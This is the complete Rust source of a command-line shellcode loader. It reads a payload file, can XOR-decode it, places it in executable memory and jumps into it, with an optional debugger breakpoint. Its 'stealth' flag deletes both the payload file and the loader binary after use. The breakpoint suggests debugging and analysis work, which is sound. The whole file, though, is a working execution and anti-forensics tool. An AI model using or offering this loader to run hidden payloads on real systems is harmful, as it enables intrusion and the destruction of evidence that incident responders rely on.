use std::arch::asm;
use std::process::Termination;
use houdini;
use region::{Protection};
use parse_int::parse;

use clap::{command, Arg, ArgAction};
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const MEM_COMMIT: u32 = 0x1000;
pub const MEM_RESERVE: u32 = 0x2000;

struct ShellExit{
    err: Result<(), String>,
}

impl ShellExit{
    fn err(err: &str) -> Self{
        ShellExit { err: Err(err.to_owned()) }
    }
    fn ok() -> Self{
        ShellExit { err: Ok(()) }
    }
}

impl Termination for ShellExit{
    fn report(self) -> std::process::ExitCode {
        match self.err{
            Ok(()) => std::process::ExitCode::from(0),
            Err(e) => { eprintln!("[-] {e}"); std::process::ExitCode::from(1)}
        }
    }
}

fn main() -> ShellExit {
    let matches = command!() 
        .arg(
            Arg::new("file")
                .short('f')
                .long("file")
                .help("shellcode path")
                .action(ArgAction::Set)
                .required(true),
        )
        .arg(
            Arg::new("breakpoint")
                .short('b')
                .long("breakpoint")
                .help("set breakpoint in debugger")
                .action(ArgAction::SetTrue)
        )
        .arg(
            Arg::new("offset")
                .short('o')
                .long("offset")
                .help("shellcode offset")
                .action(ArgAction::Set),
        )
        .arg(
            Arg::new("xor")
                .short('x')
                .long("xor")
                .help("deobfuscate with XOR encoding")
                .action(ArgAction::Set),
        )
        .arg(
            Arg::new("stealth")
                .short('s')
                .long("stealth")
                .help("removes shell code and itself")
                .action(ArgAction::SetTrue)
        )
        .get_matches();

    if matches.get_flag("stealth"){
        match houdini::disappear() {
            Ok(_) => {},
            Err(e) => eprintln!("[-] Could not self delete {}", e),
        };
    }
    let set_breakpoint = matches.get_flag("breakpoint");
    if set_breakpoint {
        println!("[*] Breakpoint flag set!");
    }
    let fp = match matches.get_one::<String>("file"){
        Some(f) => f,
        None => return ShellExit::err("file name is required"),
    };
    let offset = match matches.get_one::<String>("offset"){
        Some(of) => match parse::<usize>(of){
            Ok(val) => val,
            Err(e) => {return ShellExit::err(&format!("Reading shellcode error: {}", e));},
        },
        None => 0,
    };
    let xor = match matches.get_one::<String>("xor").map(|x| parse::<u8>(x)){
        Some(Ok(v)) => Some(v),
        Some(Err(e)) => {return ShellExit::err(&format!("Reading shellcode error: {}", e));},
        None => None,
    };
    println!("[*] Reading shellcode from path: {:?}", fp);
    let mut contents = match std::fs::read(fp) {
        Ok(res) => res,
        Err(e) => {
            return ShellExit::err(&format!("Reading shellcode error: {}", e));
        }
    };
    if matches.get_flag("stealth"){
        match std::fs::remove_file(fp){
            Err(e) => eprintln!("[-] Could not delete {fp} {}",e),
            Ok(_) => {},
        }
    }

    if let Some(xor) = xor{
        println!("[*] Using xor 0x{xor:02x} to deobfuscate shellcode");
        contents.iter_mut().for_each(|x| *x = *x ^ xor);
    }

    if offset > contents.len(){
        return ShellExit::err(&format!(
            "Offset too big, offset: {}, file length: {}", offset, contents.len()));
    }

    let mut alloc = match region::alloc(contents.len(), Protection::READ_WRITE_EXECUTE){
        Ok(a) => a,
        Err(e) => {return ShellExit::err(&format!("Reading shellcode error: {}", e));},
    };

    assert!(alloc.len() >= contents.len());

    unsafe { std::ptr::copy_nonoverlapping(contents.as_ptr(), alloc.as_mut_ptr(), contents.len()) };
    println!(
        "[*] Starting jmp to shellcode at offset 0x{:x} (base virtual address: {:p})",
        offset, alloc.as_ptr() as *const u8
    );
    unsafe {
        let jmp_target = (alloc.as_ptr() as *const u8).offset(offset as isize);
        if set_breakpoint {
            asm!("int 3");
        }
        asm!("jmp {}",in(reg) jmp_target)
    };

    ShellExit::ok()
}
